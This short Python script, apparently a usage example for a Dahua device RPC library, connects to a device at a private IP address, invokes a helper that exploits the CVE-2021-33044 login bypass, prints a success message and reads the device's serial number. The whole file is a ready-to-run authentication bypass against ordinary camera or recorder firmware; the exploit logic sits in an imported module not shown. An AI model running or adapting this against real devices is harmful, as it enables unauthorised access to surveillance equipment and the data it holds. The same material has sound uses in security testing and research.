from dahua.client import DahuaRpc
from dahua.exceptions import DahuaRequestError
from dahua.utils.cve import bypass_cve2021_33044

client = DahuaRpc(host="172.20.10.254", port=80)

try:
    bypass_cve2021_33044(client)  # login bypass
except DahuaRequestError as e:
    print(f"Failed to bypass CVE-2021-33044: {e}")
    exit(1)

print("Authentication Bypassed (CVE-2021-33044)!")
print("Serial Number: " + client.magic_box.get_serial_number())

client.logout()
